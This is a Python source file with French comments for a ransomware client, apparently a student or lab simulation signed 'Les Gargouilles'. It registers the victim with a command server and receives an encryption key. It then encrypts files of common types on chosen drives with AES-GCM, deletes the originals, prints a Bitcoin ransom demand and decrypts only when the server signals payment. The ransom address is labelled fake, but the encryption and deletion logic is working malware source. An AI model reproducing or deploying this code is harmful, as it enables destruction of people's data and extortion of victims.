import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import utile.network as network
import utile.message as message
import utile.config as config
import platform
import hashlib
import datetime

KEY_FILE_PATH = 'encryption_key.bin'  # Chemin du fichier pour stocker la clé de chiffrement
PATH_CONFIG = 'config_workstation.ini'  # Chemin du fichier de configuration
# constantes
IP_SERVEUR_FRONT = network.LOCAL_IP
PORT_SERVEUR_FRONT = 8443
CONFIG_WORKSTATION = {
    'HASH': None,
    'IP': None,
    'KEY': None,  # Clé à récupérer du serveur de clés
    'DISKS': ['Y:', 'Z:'],
    'PATHS': ['tests_1', 'tests_2'],
    'FILE_EXT': ['.jpg', '.png', '.txt', '.avi', '.mp4', '.mp3', '.pdf'],
    'FREQ': None,
    'TYPE': None,
    'OS': "Workstation",
    'STATE': None,
}
protected_send = False


def affichage_ransomware():
    print("""
    # ####################################################################################################################################################
    # #       ***** ***                                                                      ***** *    **   ***                                       # #
    # #    ******  * **                                                                   ******  *  *****    ***                                      # #
    # #   **   *  *  **                                                                  **   *  *     *****   ***                                     # # 
    # #  *    *  *   **                                                                 *    *  **     * **      **                                    # # 
    # #      *  *    *                              ****       ****                         *  ***     *         **            ***  ****               # # 
    # #     ** **   *       ****    ***  ****      * **** *   * ***  * *** **** ****       **   **     *         **    ****     **** **** *    ***     # # 
    # #     ** **  *       * ***  *  **** **** *  **  ****   *   ****   *** **** ***  *    **   **     *         **   * ***  *   **   ****    * ***    # #
    # #     ** ****       *   ****    **   ****  ****       **    **     **  **** ****     **   **     *         **  *   ****    **          *   ***   # #
    # #     ** **  ***   **    **     **    **     ***      **    **     **   **   **      **   **     *         ** **    **     **         **    ***  # #
    # #     ** **    **  **    **     **    **       ***    **    **     **   **   **      **   **     *         ** **    **     **         ********   # #
    # #     *  **    **  **    **     **    **    ****  **  **    **     **   **   **       **  **     *         ** **    **     **         *******    # #
    # #        *     **  **    **     **    **   * **** *    ******      **   **   **        ** *      *         *  **    **     **         **         # #
    # #    ****      *** **    **     **    **     ****      ****       ***  ***  ***         ***      ***      *   **    **     ***        ****    *  # #
    # #   *  ****    **   ***** **    ***   ***                          ***  ***  ***          ******** ********     ***** **     ***        *******  # #
    # #  *    **     *     ***   **    ***   ***                          ***  ***  ***          ****     ****        ***   **                *****    # #
    # #  *                                                                                                                                             # #
    # #   **                                                                                                                                           # #
    # #                                                                                                                      By_Les_Gargouilles 🗿🗿🗿# #
    # ################################################################################################################################################## #
    #                                                                                                                                                    #
    # YOUR IMPORTANT FILES ARE ENCRYPTED                                                                                                                 #
    # ==================================                                                                                                                 #
    #                                                                                                                                                    #
    # Many of your documents, photos, images and other files are no longer accessible because                                                            #
    # they have been encrypted with military grad encryption algorithm.                                                                                  #
    # Maybe you are busy looking for a way to recover you files, but do not waste your time.                                                             # 
    # Nobody can recover your files without our decryption service.                                                                                      #
    #                                                                                                                                                    #
    #                                                                                                                                                    #
    # Anyways, we guarantee that you can recover your files safely and easily. This will require us to use some processing power,                        #
    # electricity and storage on our side, to there's a fixed processing fee of 150 USD. This is a one-time payment, no additional fees included.        #
    # In order to accept this offer, you have to deposit payment within 96 hours (4 days) after receiving this message,                                  #
    # otherwise this offer will expire and you will lose your files forever.                                                                             #
    #                                                                                                                                                    #
    # Payment has to be deposited in Bitcoin based on Bitcoin/USD exchange rate at the moment of payement. The address you have to make payement is:     #
    #                                                                                                                                                    #
    #     43viFPsZf7pR3ZoKeva9yoQjrexQiDNNX9                                                                                                             #
    #     (This is a fake address)                                                                                                                       #
    #                                                                                                                                                    #
    # Copy the fake address and press enter to simulate the ransom payment :                                                                             #
    # 43viFPsZf7pR3ZoKeva9yoQjrexQiDNNX9                                                                                                                 #
    #                                                                                                                                                    # 
    # Decryption will start automatically within 48 hours after the payment has been processe. After that all of your files will be restored.            #
    # THIS OFFER IS VALIDE FOR 96 HOURS AFTER RECEIVING THIS MESSAGE                                                                                     #                                                
    #                                                                                                                                                    #
    ######################################################################################################################################################
    """)


def generate_unique_hash(system_name):
    # Concatenate system name and current time
    concatenated_string = system_name + str(datetime.datetime.now())

    # Encode the concatenated string to bytes
    encoded_string = concatenated_string.encode('utf-8')

    # Generate SHA256 hash
    sha256_hash = hashlib.sha256(encoded_string).hexdigest()

    return sha256_hash


def save_encryption_key_to_file(key):
    """
    Enregistre la clé de chiffrement dans un fichier.

    :param key: (bytes) Clé de chiffrement à enregistrer.
    """
    with open(KEY_FILE_PATH, 'wb') as key_file:
        key_file.write(key)


def load_encryption_key_from_file():
    """
    Charge la clé de chiffrement à partir du fichier.

    :return: (bytes) Clé de chiffrement chargée.
    """
    with open(KEY_FILE_PATH, 'rb') as key_file:
        return key_file.read()


def generate_encryption_key_sha256(key_length):
    """
    Génère une clé de chiffrement en utilisant SHA-256.

    :param key_length: (int) Longueur de la clé en octets (par défaut 32).
    :return: (bytes) Clé de chiffrement générée.
    """
    random_data = os.urandom(key_length)  # Génère une séquence de bytes aléatoire pour renforcer l'entropie
    hash_object = hashlib.sha256(random_data)
    hashed_data = hash_object.digest()
    return hashed_data


# Si la clé n'existe pas déjà, générer une nouvelle clé et l'enregistrer dans un fichier
if not os.path.isfile(KEY_FILE_PATH):
    encryption_key_sha256 = generate_encryption_key_sha256(32)
    save_encryption_key_to_file(encryption_key_sha256)
else:
    # Si la clé existe déjà, charger la clé à partir du fichier
    encryption_key_sha256 = load_encryption_key_from_file()


def count_encrypted_files(disk_list):
    """
    Compte le nombre de fichiers avec l'extension ".encrypted" sur les disques spécifiés.
    :param disk_list: (list) Liste des disques à inspecter (ex: ['C:', 'D:', 'E:'])
    :return: (int) Nombre total de fichiers ".encrypted" sur tous les disques
    """
    total_count = 0
    for disk in disk_list:
        try:
            for root, dirs, files in os.walk(disk):
                for file in files:
                    if file.endswith(".encrypted"):
                        total_count += 1
        except Exception as e:
            print(f"Erreur lors du parcours du disque {disk}: {e}")
    return total_count


def count_nb_files_in_disk(disks, extension):
    """
    Compte le nombre de fichiers avec une extension spécifique sur les disques spécifiés.
    :param disks: (list) Liste des disques à inspecter
    :param extension: (str) Extension des fichiers à compter
    :return: (int) Nombre total de fichiers avec l'extension spécifique
    """
    total_count = 0
    extension_tuple = tuple(extension)
    for disk in disks:
        try:
            for root, dirs, files in os.walk(disk):
                for file in files:
                    if file.endswith(extension_tuple):
                        total_count += 1
        except Exception as e:
            print(f"Erreur lors du parcours du disque {disk}: {e}")
    return total_count


def encrypt_files_in_directory(directory, key, extensions):
    """
    Chiffre tous les fichiers d'un dossier en fonction de leurs extensions
    :param directory: (str) Chemin vers le dossier contenant les fichiers à chiffrer
    :param key: (bytes) Clé de chiffrement
    :param extensions: (list) Liste des extensions des fichiers à chiffrer
    """
    # Parcourir tous les fichiers du dossier
    extensions_tuple = tuple(extensions)
    for root, dirs, files in os.walk(directory):
        for file in files:
            # Vérifier si l'extension du fichier est dans la liste des extensions à chiffrer
            if os.path.splitext(file)[1] in extensions_tuple:
                file_path = os.path.join(root, file)
                # Lire le contenu du fichier
                with open(file_path, 'rb') as f:
                    data = f.read()
                # Générer un nonce unique
                nonce = get_random_bytes(12)
                # Créer une instance AES avec la clé et le nonce
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                # Chiffrer les données
                ciphertext, tag = cipher.encrypt_and_digest(data)
                # Écrire les données chiffrées dans un nouveau fichier avec une extension .encrypted
                encrypted_file_path = file_path + '.encrypted'
                with open(encrypted_file_path, 'wb') as f:
                    f.write(nonce + ciphertext + tag)
                # Supprimer le fichier non chiffré
                os.remove(file_path)
                print("Fichier chiffré:", file_path)


def decrypt_files_in_directory(directory, key, extensions):
    """
    Déchiffre tous les fichiers d'un dossier en fonction de leurs extensions
    :param directory: (str) Chemin vers le dossier contenant les fichiers à déchiffrer
    :param key: (bytes) Clé de déchiffrement
    :param extensions: (list) Liste des extensions des fichiers à déchiffrer
    """
    for root, dirs, files in os.walk(directory):
        for file in files:
            if os.path.splitext(file)[1] == '.encrypted':
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    encrypted_data = f.read()

                # Extraire le nonce, le texte chiffré et le tag
                nonce = encrypted_data[:12]
                ciphertext = encrypted_data[12:-16]
                tag = encrypted_data[-16:]

                # Créer une instance AES avec la clé et le nonce
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)

                try:
                    # Déchiffrer les données
                    decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)

                    # Écrire les données déchiffrées dans un nouveau fichier
                    decrypted_file_path = file_path[:-len('.encrypted')]  # Retirer l'extension .encrypted
                    with open(decrypted_file_path, 'wb') as f:
                        f.write(decrypted_data)

                    print("Fichier déchiffré:", decrypted_file_path)  # Déplacer cette ligne après la suppression
                except ValueError:
                    print("Échec du déchiffrement du fichier:", file_path)

                # Supprimer le fichier chiffré après avoir déchiffré avec succès
                os.remove(file_path)


def main():
    global nb_files_to_crypt, nb_files, protected_send
    try:
        CONFIG_WORKSTATION.update()

    except:
        type = 'Workstation'
        os = platform.system()  # Récupere le nom de l'OS de la victime
        CONFIG_WORKSTATION.update({'OS': os, 'TYPE': type})

    if CONFIG_WORKSTATION['HASH'] is None:
        system_name = "MySystem"
        unique_hash = generate_unique_hash(system_name)
        CONFIG_WORKSTATION.update({'HASH': unique_hash})
        print("Unique key:", unique_hash)

    client = network.connect_to_serv(IP_SERVEUR_FRONT, 8443, 20)
    network.send_message(client, message.set_message(
        'INITIALIZE',
        [CONFIG_WORKSTATION['HASH'],
         CONFIG_WORKSTATION['OS'],
         CONFIG_WORKSTATION['DISKS']])
                         )
    print('sending init req 1')

    while True:
        data = network.receive_message(client)
        print('data:', data)
        type_message = message.get_message_type(data)
        print(type_message)
        if type_message == "KEY_RESP":
            key = data['KEY']
            print('KEY:', key)
            CONFIG_WORKSTATION.update({'HASH': data['KEY_RESP'], 'KEY': key, 'STATE': 'CRYPT'})
            print('config convertie en crypt')

        print('CONFIG_WORKSTATION :', CONFIG_WORKSTATION)

        if CONFIG_WORKSTATION['STATE'] == 'CRYPT':
            network.send_message(client, message.set_message('CHGSTATE', [CONFIG_WORKSTATION['HASH'],CONFIG_WORKSTATION['STATE']]))
            print('sending chg state 1 crypt')
            nb_files_to_crypt = count_nb_files_in_disk(CONFIG_WORKSTATION['DISKS'], CONFIG_WORKSTATION['FILE_EXT'])
            print('Nombres de fichier a crypter:', nb_files_to_crypt)
            for disk in CONFIG_WORKSTATION['DISKS']:
                encrypt_files_in_directory(disk, CONFIG_WORKSTATION['KEY'][:32], CONFIG_WORKSTATION['FILE_EXT'])
                nb_files = count_encrypted_files(CONFIG_WORKSTATION['DISKS'])
                print('fin cryptage')

            print('Autant de fichiers ont été cryptés:', nb_files)

        if nb_files == nb_files_to_crypt and CONFIG_WORKSTATION['STATE'] == 'CRYPT':
            network.send_message(client, message.set_message('PENDING_SIGNAL', [CONFIG_WORKSTATION['HASH'], nb_files]))
            affichage_ransomware()
            CONFIG_WORKSTATION['STATE'] = 'PENDING'
            print('sending chg state 2 pending')
            print('CONFIG_WORKSTATION après crypt:', CONFIG_WORKSTATION)

        if 'DECRYPT' in message.get_message_type(data):
            print('ransom paid front to ransom recu')
            CONFIG_WORKSTATION['STATE'] = 'DECRYPT'  # Passage en mode DECRYPT
            for disk in CONFIG_WORKSTATION['DISKS']:
                decrypt_files_in_directory(disk, CONFIG_WORKSTATION["KEY"][:32], ['.encrypted'])

        if CONFIG_WORKSTATION['STATE'] == 'DECRYPT' and not protected_send:
            print('CONFIG_WORKSTATION après demande de décrypt:', CONFIG_WORKSTATION)
            nb_files = count_nb_files_in_disk(CONFIG_WORKSTATION['DISKS'], CONFIG_WORKSTATION['FILE_EXT'])
            network.send_message(client, message.set_message('PROTECTREQ', [CONFIG_WORKSTATION['HASH'], nb_files]))
            print('sending protect req')
            protected_send = True

        if 'PROTECTRESP' in message.get_message_type(data):
            print('PROTECTRESP')
            CONFIG_WORKSTATION['STATE'] = 'PROTECTED'
            print(data['MESSAGE'])
        if CONFIG_WORKSTATION['STATE'] == 'PROTECTED':
            break


if __name__ == '__main__':
    main()
